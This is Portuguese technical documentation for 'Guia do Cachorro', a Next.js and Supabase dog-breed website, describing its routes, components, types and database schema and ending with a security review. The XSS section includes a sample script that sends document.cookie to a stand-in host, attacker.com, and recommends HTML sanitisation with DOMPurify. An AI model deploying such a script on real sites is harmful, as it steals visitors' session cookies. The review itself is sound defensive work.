# 📋 Documentação Técnica - Guia do Cachorro

**Versão:** 4.0 (Completa e Atualizada com Sistema de Blog)  
**Data:** Dezembro 2024  
**Framework:** Next.js 16.1.1 (App Router)  
**Stack:** TypeScript, Supabase, TailwindCSS, React 19, Framer Motion

---

## 📑 Sumário

1. [Visão Geral](#visão-geral)
2. [Stack Tecnológico](#stack-tecnológico)
3. [Arquitetura do Projeto](#arquitetura-do-projeto)
4. [Estrutura Completa de Pastas e Arquivos](#estrutura-completa-de-pastas-e-arquivos)
5. [Mapeamento de Rotas](#mapeamento-de-rotas)
6. [Mapeamento de Componentes](#mapeamento-de-componentes)
7. [Mapeamento de Funções e Módulos](#mapeamento-de-funções-e-módulos)
8. [Tipos e Interfaces](#tipos-e-interfaces)
9. [Configuração do Supabase](#configuração-do-supabase)
10. [Análise de Segurança e Vulnerabilidades](#análise-de-segurança-e-vulnerabilidades)
11. [Problemas Identificados](#problemas-identificados)
12. [Pendências e Tarefas](#pendências-e-tarefas)
13. [Novas Ideias e Melhorias](#novas-ideias-e-melhorias)
14. [Checklist Técnico](#checklist-técnico)

---

## 🎯 Visão Geral

O **Guia do Cachorro** é uma aplicação web moderna construída com Next.js 16, oferecendo um guia completo sobre raças de cães. A aplicação utiliza o App Router do Next.js para gerenciamento de rotas, Supabase como backend (PostgreSQL), e TailwindCSS para estilização.

### Características Principais

- ✅ **CMS-like**: Conteúdo dinâmico gerenciado via Supabase
- ✅ **SSR/SSG**: Renderização no servidor para melhor SEO
- ✅ **TypeScript**: Tipagem estática em todo o projeto
- ✅ **Design Responsivo**: Interface moderna e adaptável
- ✅ **Animações**: Framer Motion para transições suaves
- ✅ **Busca e Filtros**: Sistema de busca e categorização de raças
- ✅ **Sistema de Blog**: Artigos e posts sobre cuidados com cães
- ✅ **Navegação Atualizada**: Menu com acesso direto ao blog

---

## 💻 Stack Tecnológico

### Dependências Principais

| Pacote | Versão | Propósito |
|--------|--------|-----------|
| `next` | 16.1.1 | Framework React com App Router |
| `react` | 19.2.3 | Biblioteca UI |
| `react-dom` | 19.2.3 | Renderização React DOM |
| `@supabase/supabase-js` | 2.90.1 | Cliente Supabase (PostgreSQL) |
| `tailwindcss` | 4 | Framework CSS utility-first |
| `framer-motion` | 12.26.2 | Biblioteca de animações |
| `typescript` | 5 | Superset JavaScript com tipagem |
| `clsx` | 2.1.1 | Utilitário para classes condicionais |
| `tailwind-merge` | 3.4.0 | Merge de classes Tailwind |

### Dependências de Desenvolvimento

| Pacote | Versão | Propósito |
|--------|--------|-----------|
| `@types/node` | ^20 | Tipos TypeScript para Node.js |
| `@types/react` | ^19 | Tipos TypeScript para React |
| `@types/react-dom` | ^19 | Tipos TypeScript para React DOM |
| `eslint` | ^9 | Linter JavaScript/TypeScript |
| `eslint-config-next` | 16.1.1 | Configuração ESLint para Next.js |

---

## 🏗️ Arquitetura do Projeto

### Diagrama de Arquitetura

```
┌─────────────────────────────────────────────────────────────┐
│                    Next.js App Router                        │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                  │
│  │   Home   │  │ [slug]   │  │ /racas   │                  │
│  │    /     │  │ /sobre   │  │/racas/   │                  │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘                  │
│       │             │             │                         │
│       └─────────────┴─────────────┘                         │
│                      │                                      │
│              ┌───────▼────────┐                            │
│              │  lib/data/     │                            │
│              │  - pages.ts    │                            │
│              │  - breeds.ts   │                            │
│              └───────┬────────┘                            │
│                      │                                      │
│              ┌───────▼────────┐                            │
│              │ lib/supabase.ts│                            │
│              │  (Singleton)   │                            │
│              └───────┬────────┘                            │
│                      │                                      │
│              ┌───────▼────────┐                            │
│              │   Supabase     │                            │
│              │   PostgreSQL   │                            │
│              └────────────────┘                            │
└─────────────────────────────────────────────────────────────┘
```

### Padrões Arquiteturais

1. **Server Components**: Maioria dos componentes são Server Components (melhor performance)
2. **Client Components**: Apenas onde necessário (interatividade, hooks)
3. **Separação de Responsabilidades**: 
   - `lib/data/` - Acesso a dados
   - `lib/types/` - Definições de tipos
   - `components/` - Componentes React
4. **Singleton Pattern**: Cliente Supabase compartilhado
5. **Type Safety**: TypeScript em todo o projeto

---

## 📁 Estrutura Completa de Pastas e Arquivos

### Árvore de Diretórios

```
guia-do-cachorro/
├── app/                              # Next.js App Router
│   ├── [slug]/                      # Rota dinâmica para páginas
│   │   └── page.tsx                 # Componente Server Component para /[slug]
│   ├── blog/                        # Módulo de blog (artigos)
│   │   ├── [slug]/                  # Rota dinâmica para detalhes do artigo
│   │   │   └── page.tsx             # Página de detalhes do artigo
│   │   └── page.tsx                 # Listagem de todos os artigos
│   ├── racas/                       # Módulo de raças
│   │   ├── [slug]/                  # Rota dinâmica para detalhes da raça
│   │   │   └── page.tsx             # Página de detalhes da raça
│   │   └── page.tsx                 # Listagem de todas as raças
│   ├── sobre/                       # Página Sobre
│   │   └── page.tsx                 # Página sobre o projeto
│   ├── layout.tsx                   # Layout global da aplicação
│   ├── page.tsx                     # Home page (/)
│   ├── not-found.tsx                # Página 404 customizada
│   ├── globals.css                  # Estilos globais
│   └── favicon.ico                  # Ícone do site
│
├── components/                      # Componentes React reutilizáveis
│   ├── blog/                        # Componentes do blog
│   │   └── ArticleCard.tsx         # Card individual de artigo (Client)
│   ├── breeds/                      # Componentes específicos de raças
│   │   ├── BreedCard.tsx           # Card individual de raça (Client)
│   │   ├── BreedGrid.tsx           # Grid com busca e filtros (Client)
│   │   ├── BreedStats.tsx          # Estatísticas da raça
│   │   └── CategoryFilter.tsx      # Filtro de categorias (Client)
│   ├── home/                        # Componentes da página inicial
│   │   ├── AuthoritySection.tsx    # Seção de autoridade
│   │   ├── CareGuides.tsx          # Guias de cuidados
│   │   ├── EditorialHighlights.tsx # Destaques editoriais
│   │   ├── FAQ.tsx                 # Seção FAQ
│   │   ├── FinalCTA.tsx            # Call-to-action final
│   │   ├── Hero.tsx                # Hero section da home
│   │   └── PopularBreeds.tsx       # Raças populares (dados estáticos)
│   ├── layout/                      # Componentes de layout
│   │   ├── Header.tsx              # Header fixo (Server Component)
│   │   └── Footer.tsx              # Footer (Server Component)
│
├── lib/                             # Utilitários e configurações
│   ├── data/                        # Camada de acesso a dados
│   │   ├── articles.ts             # ✅ Funções getAllArticles, getFeaturedArticles, getArticleBySlug
│   │   ├── pages.ts                # ✅ Função getPageBySlug
│   │   └── breeds.ts               # ✅ Funções getAllBreeds, getBreedBySlug
│   ├── types/                       # Tipos TypeScript
│   │   └── pages.ts                # ✅ Tipo Page unificado
│   └── supabase.ts                 # Cliente Supabase (singleton)
│
├── public/                          # Arquivos estáticos
│   ├── file.svg
│   ├── globe.svg
│   ├── next.svg
│   ├── vercel.svg
│   └── window.svg
│
├── .gitignore                      # Arquivos ignorados pelo Git
├── DOCUMENTACAO_TECNICA.md        # Esta documentação
├── eslint.config.mjs              # Configuração ESLint
├── next.config.ts                 # Configuração do Next.js
├── package.json                   # Dependências e scripts
├── postcss.config.mjs             # Configuração PostCSS
├── README.md                      # README do projeto
└── tsconfig.json                  # Configuração TypeScript
```

### Análise por Diretório

#### `app/` - Next.js App Router
- **Propósito**: Contém todas as rotas da aplicação
- **Arquitetura**: Estrutura de arquivos determina rotas
- **Observações**: 
  - Rotas dinâmicas: `[slug]`, `racas/[slug]`
  - Layout global aplicado automaticamente

#### `components/` - Componentes React
- **Propósito**: Componentes reutilizáveis
- **Estrutura**: 
  - `breeds/` - Componentes específicos de raças
  - `layout/` - Componentes de layout (Header, Footer)
- **⚠️ Problema**: Header.tsx e Footer.tsx duplicados (legacy não utilizado)

#### `lib/` - Biblioteca de Utilitários
- **Propósito**: Lógica compartilhada, tipos e configurações
- **Estrutura**:
  - `data/` - Funções de acesso a dados (Supabase)
  - `types/` - Definições de tipos TypeScript
  - `supabase.ts` - Cliente Supabase singleton

#### `public/` - Arquivos Estáticos
- **Propósito**: Assets públicos (imagens, ícones)
- **Acesso**: Via URL `/file.svg`

---

## 🗺️ Mapeamento de Rotas

### Rotas Identificadas

| Rota | Arquivo | Tipo | Componente | Status |
|------|---------|------|------------|--------|
| `/` | `app/page.tsx` | Estática | Home | ✅ Funcionando |
| `/[slug]` | `app/[slug]/page.tsx` | Dinâmica | DynamicPage | ✅ Funcionando |
| `/blog` | `app/blog/page.tsx` | Estática | BlogPage | ✅ Funcionando |
| `/blog/[slug]` | `app/blog/[slug]/page.tsx` | Dinâmica | ArticlePage | ✅ Funcionando |
| `/racas` | `app/racas/page.tsx` | Estática | RacasPage | ✅ Funcionando |
| `/racas/[slug]` | `app/racas/[slug]/page.tsx` | Dinâmica | BreedDetailsPage | ✅ Funcionando |
| `/sobre` | `app/sobre/page.tsx` | Estática | SobrePage | ✅ Funcionando |
| `/404` | `app/not-found.tsx` | Especial | NotFound | ✅ Funcionando |

### Detalhamento das Rotas

#### 1. Home (`/`)

**Arquivo:** `app/page.tsx`

**Características:**
- ✅ Server Component
- ✅ Composição de múltiplos componentes
- ✅ Sem fetch de dados (dados estáticos nos componentes)

**Componentes Utilizados:**
```typescript
<Hero />
<AuthoritySection />
<PopularBreeds />
<EditorialHighlights articles={articles} />
<FinalCTA />
```

**Dados Utilizados:**
- `getFeaturedArticles()` - Busca artigos em destaque para a seção EditorialHighlights

**Fluxo:**
```
Usuário acessa / 
→ Next.js renderiza app/page.tsx 
→ Composição de componentes
→ HTML enviado ao cliente
```

#### 2. Rota Dinâmica `/[slug]`

**Arquivo:** `app/[slug]/page.tsx`

**Características:**
- ✅ Server Component assíncrono
- ✅ Busca dados do Supabase
- ✅ Verifica status "published"
- ✅ Renderiza HTML via `dangerouslySetInnerHTML`

**Funções Utilizadas:**
- `getPageBySlug(slug)` - Busca página no Supabase

**Fluxo:**
```
Usuário acessa /sobre
→ Next.js identifica [slug] = "sobre"
→ Carrega app/[slug]/page.tsx
→ await params para obter slug
→ Chama getPageBySlug("sobre")
→ Verifica status === "published"
→ Se não encontrar ou status !== "published": notFound()
→ Se encontrar: renderiza página com HTML
```

**Código Principal:**
```typescript
export default async function DynamicPage({ params }: PageProps) {
  const { slug } = await params
  const page = await getPageBySlug(slug)
  
  if (!page || page.status !== "published") {
    notFound()
  }
  
  return (
    <main className="prose mx-auto py-10">
      <h1>{page.title}</h1>
      <div dangerouslySetInnerHTML={{ __html: page.content }} />
    </main>
  )
}
```

#### 3. Listagem de Raças (`/racas`)

**Arquivo:** `app/racas/page.tsx`

**Características:**
- ✅ Server Component assíncrono
- ✅ Busca todas as raças do Supabase
- ✅ Renderiza BreedGrid (Client Component)

**Funções Utilizadas:**
- `getAllBreeds()` - Busca todas as raças

**Fluxo:**
```
Usuário acessa /racas
→ Next.js renderiza app/racas/page.tsx
→ await getAllBreeds()
→ Renderiza BreedGrid com dados
→ BreedGrid implementa busca e filtros (client-side)
```

#### 4. Detalhes da Raça (`/racas/[slug]`)

**Arquivo:** `app/racas/[slug]/page.tsx`

**Características:**
- ✅ Server Component assíncrono
- ✅ Busca raça específica no Supabase
- ✅ Layout rico com imagem hero
- ✅ Renderiza estatísticas da raça

**Funções Utilizadas:**
- `getBreedBySlug(slug)` - Busca raça específica

**Componentes Utilizados:**
- `BreedStats` - Estatísticas da raça

**Fluxo:**
```
Usuário acessa /racas/labrador
→ Next.js identifica [slug] = "labrador"
→ await params
→ Chama getBreedBySlug("labrador")
→ Se não encontrar: notFound()
→ Se encontrar: renderiza página de detalhes
```

#### 5. Listagem de Artigos (`/blog`)

**Arquivo:** `app/blog/page.tsx`

**Características:**
- ✅ Server Component assíncrono
- ✅ Busca todos os artigos
- ✅ Renderiza grid de artigos
- ✅ Empty state quando não há artigos

**Funções Utilizadas:**
- `getAllArticles()` - Busca todos os artigos

**Componentes Utilizados:**
- `ArticleCard` - Card individual de artigo

**Fluxo:**
```
Usuário acessa /blog
→ Next.js renderiza app/blog/page.tsx
→ await getAllArticles()
→ Renderiza grid com ArticleCard para cada artigo
→ Se não houver artigos: mostra empty state
```

#### 6. Detalhes do Artigo (`/blog/[slug]`)

**Arquivo:** `app/blog/[slug]/page.tsx`

**Características:**
- ✅ Server Component assíncrono
- ✅ Busca artigo específico pelo slug
- ✅ Layout rico com imagem hero
- ✅ Renderiza conteúdo HTML via `dangerouslySetInnerHTML`
- ✅ Calcula tempo de leitura automaticamente

**Funções Utilizadas:**
- `getArticleBySlug(slug)` - Busca artigo específico

**Fluxo:**
```
Usuário acessa /blog/ansiedade-separacao
→ Next.js identifica [slug] = "ansiedade-separacao"
→ await params
→ Chama getArticleBySlug("ansiedade-separacao")
→ Se não encontrar: notFound()
→ Se encontrar: renderiza página de detalhes com conteúdo HTML
```

**⚠️ Segurança:**
- Usa `dangerouslySetInnerHTML` para renderizar conteúdo HTML
- Recomendado implementar sanitização (DOMPurify)

#### 7. Página Sobre (`/sobre`)

**Arquivo:** `app/sobre/page.tsx`

**Características:**
- ✅ Server Component
- ✅ Página estática sobre o projeto

#### 8. Página 404 (`not-found.tsx`)

**Arquivo:** `app/not-found.tsx`

**Características:**
- ✅ Server Component assíncrono
- ✅ Busca página "404" no Supabase (opcional)
- ✅ Fallback local se não encontrar
- ✅ Try-catch para erros

**Funções Utilizadas:**
- `getPageBySlug("404")` - Tenta buscar página 404 customizada

**Fluxo:**
```
notFound() é chamado
→ Next.js renderiza app/not-found.tsx
→ Tenta buscar página "404" no Supabase
→ Se falhar: usa fallback local
→ Renderiza página 404
```

---

## 🧩 Mapeamento de Componentes

### Componentes por Categoria

#### Componentes de Layout

| Componente | Arquivo | Tipo | Status | Descrição |
|------------|---------|------|--------|-----------|
| `Header` | `components/layout/Header.tsx` | Server | ✅ Em uso | Header fixo com navegação (menu: Raças, Saúde, Blog, Sobre) |
| `Footer` | `components/layout/Footer.tsx` | Server | ✅ Em uso | Footer com links e newsletter |

#### Componentes de Blog

| Componente | Arquivo | Tipo | Status | Descrição |
|------------|---------|------|--------|-----------|
| `ArticleCard` | `components/blog/ArticleCard.tsx` | Client | ✅ Em uso | Card individual de artigo com imagem, categoria e data |

#### Componentes de Raças

| Componente | Arquivo | Tipo | Status | Descrição |
|------------|---------|------|--------|-----------|
| `BreedCard` | `components/breeds/BreedCard.tsx` | Client | ✅ Em uso | Card individual de raça |
| `BreedGrid` | `components/breeds/BreedGrid.tsx` | Client | ✅ Em uso | Grid com busca e filtros |
| `BreedStats` | `components/breeds/BreedStats.tsx` | Server/Client | ✅ Em uso | Estatísticas da raça |
| `CategoryFilter` | `components/breeds/CategoryFilter.tsx` | Client | ✅ Em uso | Filtro de categorias |

#### Componentes da Home

| Componente | Arquivo | Tipo | Status | Descrição |
|------------|---------|------|--------|-----------|
| `Hero` | `components/home/Hero.tsx` | Server | ✅ Em uso | Hero section |
| `AuthoritySection` | `components/home/AuthoritySection.tsx` | Server | ✅ Em uso | Seção de autoridade |
| `EditorialHighlights` | `components/home/EditorialHighlights.tsx` | Server | ✅ Em uso | Destaques editoriais (recebe artigos como prop) |
| `PopularBreeds` | `components/home/PopularBreeds.tsx` | Server | ✅ Em uso | Raças populares (dados estáticos) |
| `FinalCTA` | `components/home/FinalCTA.tsx` | Server | ✅ Em uso | Call-to-action final |

### Detalhamento dos Componentes Principais

#### `Header` (Layout)

**Arquivo:** `components/layout/Header.tsx`

**Características:**
- ✅ Server Component
- ✅ Menu de navegação fixo: Raças, Saúde, Blog, Sobre
- ✅ Logo com link para home
- ✅ Botão CTA "Explorar Raças"
- ✅ Menu mobile (preparado para implementação)

**Menu de Navegação:**
- **Raças**: Link para `/racas`
- **Saúde**: Link para `/saude` (normalizado)
- **Blog**: Link para `/blog` ✅ (atualizado de "Curiosidades")
- **Sobre**: Link para `/sobre`

**Dependências:**
- `lucide-react` - Ícones (Dog, Menu)

#### `ArticleCard` (Blog)

**Arquivo:** `components/blog/ArticleCard.tsx`

**Características:**
- ✅ Client Component (`"use client"`)
- ✅ Link para detalhes do artigo
- ✅ Imagem com hover effect
- ✅ Badge de categoria
- ✅ Data formatada em português
- ✅ Resumo do artigo (excerpt)

**Animações:**
- Scale no hover da imagem
- Translate no hover do card
- Transição de cor no título

#### `BreedGrid` (Raças)

**Arquivo:** `components/breeds/BreedGrid.tsx`

**Características:**
- ✅ Client Component (`"use client"`)
- ✅ Busca em tempo real
- ✅ Filtro por categoria
- ✅ Animações com Framer Motion

**Funcionalidades:**
- Busca por nome da raça
- Filtro por categoria
- Empty state quando não encontra resultados
- Animações suaves na transição

**Hooks Utilizados:**
- `useState` - Categoria ativa, termo de busca
- `useMemo` - Categorias únicas, raças filtradas

#### `BreedCard` (Raças)

**Arquivo:** `components/breeds/BreedCard.tsx`

**Características:**
- ✅ Client Component (`"use client"`)
- ✅ Animação de entrada
- ✅ Hover effects
- ✅ Link para detalhes da raça

**Animações:**
- Fade in na entrada
- Scale no hover da imagem
- Rotação do ícone no hover

---

## 🔧 Mapeamento de Funções e Módulos

### Funções de Acesso a Dados

#### `lib/data/articles.ts`

**Interface:** `Article`

**Definição:**
```typescript
export interface Article {
  id?: number;
  slug: string;
  title: string;
  excerpt: string;
  image: string;
  image_url: string; // Alias para compatibilidade
  category: string;
  author: string;
  date: string;
  created_at: string; // Para compatibilidade com componentes
  readTime: string;
  content?: string; // Conteúdo HTML do artigo
}
```

**Função 1:** `getAllArticles(): Promise<Article[]>`

**Descrição:** Busca todos os artigos do blog

**Retorno:**
- `Promise<Article[]>` - Array de artigos

**Usada em:**
- `app/blog/page.tsx`

**Função 2:** `getFeaturedArticles(): Promise<Article[]>`

**Descrição:** Busca artigos em destaque para a página inicial

**Retorno:**
- `Promise<Article[]>` - Array de artigos em destaque

**Usada em:**
- `app/page.tsx` (página inicial)

**Função 3:** `getArticleBySlug(slug: string): Promise<Article | undefined>`

**Descrição:** Busca um artigo específico pelo slug

**Parâmetros:**
- `slug: string` - Slug do artigo

**Retorno:**
- `Promise<Article | undefined>` - Artigo encontrado ou undefined

**Usada em:**
- `app/blog/[slug]/page.tsx`

**Observação:** ⚠️ Atualmente usa dados estáticos (array em memória). Futuro: migrar para Supabase.

#### `lib/data/pages.ts`

**Função:** `getPageBySlug(slug: string): Promise<Page | null>`

**Descrição:** Busca uma página pelo slug no Supabase

**Parâmetros:**
- `slug: string` - Slug da página

**Retorno:**
- `Promise<Page | null>` - Página encontrada ou null

**Implementação:**
```typescript
export async function getPageBySlug(slug: string): Promise<Page | null> {
  const { data, error } = await supabase
    .from("pages")
    .select("*")
    .eq("slug", slug)
    .maybeSingle(); 

  if (error) {
    console.error("Erro ao buscar página:", error.message);
    return null;
  }

  return data;
}
```

**Usada em:**
- `app/[slug]/page.tsx`
- `app/not-found.tsx`

#### `lib/data/breeds.ts`

**Função 1:** `getBreedBySlug(slug: string): Promise<Breed | null>`

**Descrição:** Busca uma raça específica pelo slug

**Parâmetros:**
- `slug: string` - Slug da raça

**Retorno:**
- `Promise<Breed | null>` - Raça encontrada ou null

**Usada em:**
- `app/racas/[slug]/page.tsx`

**Função 2:** `getAllBreeds(): Promise<Breed[]>`

**Descrição:** Busca todas as raças do banco de dados

**Retorno:**
- `Promise<Breed[]>` - Array de raças (ou array vazio em caso de erro)

**Usada em:**
- `app/racas/page.tsx`

**Observação:** ⚠️ `lib/data/breeds.ts` cria seu próprio cliente Supabase ao invés de usar o singleton `lib/supabase.ts`. Isso é uma **inconsistência arquitetural**.

### Configuração do Supabase

#### `lib/supabase.ts`

**Export:** `supabase` - Cliente Supabase singleton

**Descrição:** Cliente único compartilhado por toda a aplicação

**Implementação:**
```typescript
export const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);
```

**⚠️ Problemas:**
- Não valida variáveis de ambiente (usa `!` para forçar non-null)
- Pode falhar silenciosamente se variáveis não existirem

**Usado em:**
- `lib/data/pages.ts`

---

## 📝 Tipos e Interfaces

### Tipo `Page`

**Arquivo:** `lib/types/pages.ts`

**Definição:**
```typescript
export type Page = {
  id: string
  slug: string
  title: string
  content: string
  status: "draft" | "published"
  image_url?: string | null
  created_at: string
  updated_at?: string
}
```

**Campos:**
- `id: string` - UUID da página
- `slug: string` - Identificador URL-friendly
- `title: string` - Título da página
- `content: string` - HTML completo do conteúdo
- `status: "draft" | "published"` - Estado de publicação
- `image_url?: string | null` - URL da imagem (opcional)
- `created_at: string` - Data de criação (ISO string)
- `updated_at?: string` - Data de atualização (opcional)

**Usado em:**
- `lib/data/pages.ts`
- `app/[slug]/page.tsx`
- `app/not-found.tsx`

### Interface `Article`

**Arquivo:** `lib/data/articles.ts`

**Definição:**
```typescript
export interface Article {
  id?: number;
  slug: string;
  title: string;
  excerpt: string;
  image: string;
  image_url: string; // Alias para compatibilidade
  category: string;
  author: string;
  date: string;
  created_at: string; // Para compatibilidade com componentes
  readTime: string;
  content?: string; // Conteúdo HTML do artigo
}
```

**Campos:**
- `id?: number` - ID numérico do artigo (opcional)
- `slug: string` - Identificador URL-friendly
- `title: string` - Título do artigo
- `excerpt: string` - Resumo do artigo
- `image: string` - URL da imagem principal
- `image_url: string` - Alias para compatibilidade com componentes
- `category: string` - Categoria do artigo (ex: "Comportamento", "Nutrição", "Saúde")
- `author: string` - Nome do autor
- `date: string` - Data formatada (ex: "12 Jan 2024")
- `created_at: string` - Data em formato ISO (para componentes)
- `readTime: string` - Tempo estimado de leitura (ex: "5 min")
- `content?: string` - Conteúdo HTML completo do artigo (opcional)

**Usado em:**
- `lib/data/articles.ts`
- `components/blog/ArticleCard.tsx`
- `components/home/EditorialHighlights.tsx`
- `app/blog/page.tsx`
- `app/blog/[slug]/page.tsx`
- `app/page.tsx`

### Interface `Breed`

**Arquivo:** `lib/data/breeds.ts`

**Definição:**
```typescript
export interface Breed {
  id: string;
  name: string;
  slug: string;
  category: string;
  description: string;
  image_url: string;
  characteristics: string[];
  stats: {
    label: string;
    value: number;
    color: string;
  }[];
}
```

**Campos:**
- `id: string` - UUID da raça
- `name: string` - Nome da raça
- `slug: string` - Identificador URL-friendly
- `category: string` - Categoria da raça
- `description: string` - Descrição completa
- `image_url: string` - URL da imagem
- `characteristics: string[]` - Array de características
- `stats: Array<{label, value, color}>` - Estatísticas (personalidade)

**Usado em:**
- `lib/data/breeds.ts`
- `components/breeds/BreedCard.tsx`
- `components/breeds/BreedGrid.tsx`
- `components/breeds/BreedStats.tsx`
- `app/racas/page.tsx`
- `app/racas/[slug]/page.tsx`

---

## 🗄️ Configuração do Supabase

### Estrutura do Banco de Dados

#### Tabela `pages`

**Schema:**
```sql
CREATE TABLE pages (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  slug TEXT UNIQUE NOT NULL,
  title TEXT NOT NULL,
  content TEXT NOT NULL,
  status TEXT NOT NULL CHECK (status IN ('draft', 'published')),
  image_url TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  updated_at TIMESTAMP WITH TIME ZONE
);
```

**Índices Recomendados:**
```sql
CREATE INDEX idx_pages_slug ON pages(slug);
CREATE INDEX idx_pages_status ON pages(status);
```

**Políticas RLS (Row Level Security):**
- ⚠️ **Verificar se RLS está habilitado**
- Se habilitado, criar política pública de leitura:
  ```sql
  CREATE POLICY "Allow public read access" ON pages
  FOR SELECT USING (status = 'published');
  ```

#### Tabela `breeds`

**Schema (Inferido):**
```sql
CREATE TABLE breeds (
  id UUID PRIMARY KEY,
  name TEXT NOT NULL,
  slug TEXT UNIQUE NOT NULL,
  category TEXT NOT NULL,
  description TEXT NOT NULL,
  image_url TEXT NOT NULL,
  characteristics TEXT[],
  stats JSONB -- Array de objetos {label, value, color}
);
```

**Índices Recomendados:**
```sql
CREATE INDEX idx_breeds_slug ON breeds(slug);
CREATE INDEX idx_breeds_category ON breeds(category);
CREATE INDEX idx_breeds_name ON breeds(name);
```

**Políticas RLS:**
- ⚠️ **Verificar se RLS está habilitado**
- Criar política pública de leitura:
  ```sql
  CREATE POLICY "Allow public read access" ON breeds
  FOR SELECT USING (true);
  ```

### Cliente Supabase

**Arquivo:** `lib/supabase.ts`

**Configuração:**
- URL: `process.env.NEXT_PUBLIC_SUPABASE_URL`
- Anon Key: `process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY`
- Singleton pattern (uma instância compartilhada)

**⚠️ Problemas:**
1. **Falta validação** de variáveis de ambiente
2. **Inconsistência**: `lib/data/breeds.ts` cria seu próprio cliente

---

## 🔒 Análise de Segurança e Vulnerabilidades

### Vulnerabilidades Críticas

#### 1. ⚠️ XSS (Cross-Site Scripting) - `dangerouslySetInnerHTML`

**Severidade:** ALTA

**Localização:**
- `app/[slug]/page.tsx` (linha 26)
- `app/not-found.tsx` (linha 69)

**Problema:**
O uso de `dangerouslySetInnerHTML` renderiza HTML diretamente do banco de dados sem sanitização. Se um atacante conseguir inserir HTML malicioso no banco (via SQL injection ou acesso não autorizado), scripts podem ser executados.

**Exemplo de Ataque:**
```html
<script>
  // Roubar cookies, fazer requisições maliciosas, etc.
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**Soluções Recomendadas:**
1. **Sanitizar HTML** antes de renderizar:
   ```typescript
   import DOMPurify from 'isomorphic-dompurify';
   
   const cleanHTML = DOMPurify.sanitize(page.content);
   <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />
   ```

2. **Validar conteúdo** no backend (Supabase) via triggers:
   ```sql
   CREATE FUNCTION sanitize_page_content() RETURNS TRIGGER AS $$
   BEGIN
     -- Implementar lógica de sanitização
     RETURN NEW;
   END;
   $$ LANGUAGE plpgsql;
   ```

3. **Usar biblioteca de sanitização**: `dompurify`, `sanitize-html`

#### 2. ⚠️ Falta de Validação de Variáveis de Ambiente

**Severidade:** MÉDIA

**Localização:**
- `lib/supabase.ts` (linhas 4-5)
- `lib/data/breeds.ts` (linhas 19-20)

**Problema:**
Variáveis de ambiente não são validadas. Se não existirem, o aplicativo pode falhar de forma silenciosa ou gerar erros confusos.

**Solução:**
```typescript
// lib/env.ts
export function validateEnv() {
  const url = process.env.NEXT_PUBLIC_SUPABASE_URL;
  const key = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
  
  if (!url || !key) {
    throw new Error(
      'Missing required environment variables: ' +
      'NEXT_PUBLIC_SUPABASE_URL and/or NEXT_PUBLIC_SUPABASE_ANON_KEY'
    );
  }
  
  return { url, key };
}

// lib/supabase.ts
import { validateEnv } from './env';

const { url, key } = validateEnv();
export const supabase = createClient(url, key);
```

#### 3. ⚠️ Exposição de Anon Key no Cliente

**Severidade:** BAIXA (Esperado para Supabase)

**Localização:**
- `lib/supabase.ts`
- `lib/data/breeds.ts`

**Problema:**
A `ANON_KEY` é exposta no cliente (prefixo `NEXT_PUBLIC_`). Isso é **esperado** para Supabase, mas requer que:
- RLS (Row Level Security) esteja habilitado
- Políticas RLS sejam restritivas
- Não haja operações sensíveis sem autenticação

**Recomendações:**
- ✅ Verificar se RLS está habilitado em todas as tabelas
- ✅ Validar políticas RLS
- ✅ Usar `SERVICE_ROLE_KEY` no servidor para operações sensíveis (não implementado)

#### 4. ⚠️ Falta de Rate Limiting

**Severidade:** MÉDIA

**Problema:**
Não há rate limiting nas requisições ao Supabase. Um atacante pode fazer muitas requisições e esgotar limites da conta.

**Soluções:**
1. Implementar rate limiting no Next.js (middleware)
2. Configurar rate limiting no Supabase
3. Usar cache para reduzir requisições

### Vulnerabilidades Menores

#### 5. ⚠️ Logs de Erro no Console (Produção)

**Severidade:** BAIXA

**Localização:**
- `lib/data/pages.ts` (linha 13)
- `lib/data/breeds.ts` (linhas 31, 46)

**Problema:**
Logs de erro podem expor informações sensíveis em produção.

**Solução:**
```typescript
if (process.env.NODE_ENV === 'development') {
  console.error("Erro ao buscar página:", error.message);
}
// Ou usar sistema de logging adequado (Sentry, etc.)
```

#### 6. ⚠️ Tratamento de Erro Genérico

**Severidade:** BAIXA

**Localização:**
- `lib/data/pages.ts`
- `lib/data/breeds.ts`

**Problema:**
Todos os erros retornam `null`, dificultando diagnóstico.

**Solução:**
Diferenciar tipos de erro:
```typescript
if (error.code === 'PGRST116') {
  // Página não encontrada
  return null;
} else {
  // Erro de conexão ou outro
  throw new Error(`Database error: ${error.message}`);
}
```

---

## ✅ Correções e Implementações Recentes

### Implementações Realizadas (Dezembro 2024)

#### 1. ✅ Sistema de Blog Implementado

**O que foi feito:**
- ✅ Criadas rotas `/blog` e `/blog/[slug]`
- ✅ Implementada interface `Article` completa
- ✅ Criadas funções `getAllArticles()`, `getFeaturedArticles()`, `getArticleBySlug()`
- ✅ Criado componente `ArticleCard` para exibição de artigos
- ✅ Integrado blog na página inicial (EditorialHighlights)
- ✅ Implementada página de detalhes do artigo com renderização HTML

**Status:** Funcionando com dados estáticos

**Próximos Passos:**
- [ ] Migrar para Supabase (tabela `articles`)
- [ ] Implementar sanitização HTML (DOMPurify)
- [ ] Adicionar busca e filtros

#### 2. ✅ Navegação Atualizada

**O que foi feito:**
- ✅ Menu "Curiosidades" substituído por "Blog"
- ✅ Link atualizado para `/blog`
- ✅ Header atualizado em `components/layout/Header.tsx`

**Status:** Implementado e funcionando

#### 3. ✅ Correção de Bugs

**O que foi feito:**
- ✅ Função `getAllArticles()` criada (corrigido erro de export não encontrado)
- ✅ Interface `Article` atualizada com todos os campos necessários
- ✅ Dados de artigos completos com `id`, `image_url`, `created_at`, `content`
- ✅ Componente `ArticleCard` funcionando corretamente

**Status:** Todos os bugs corrigidos

#### 4. ✅ Limpeza de Código

**O que foi feito:**
- ✅ Componentes legacy removidos (`components/Header.tsx`, `components/Footer.tsx`)
- ✅ Estrutura de pastas organizada (`components/home/`, `components/blog/`, `components/layout/`)

**Status:** Código limpo e organizado

---

## 🐛 Problemas Identificados

### Problemas Críticos

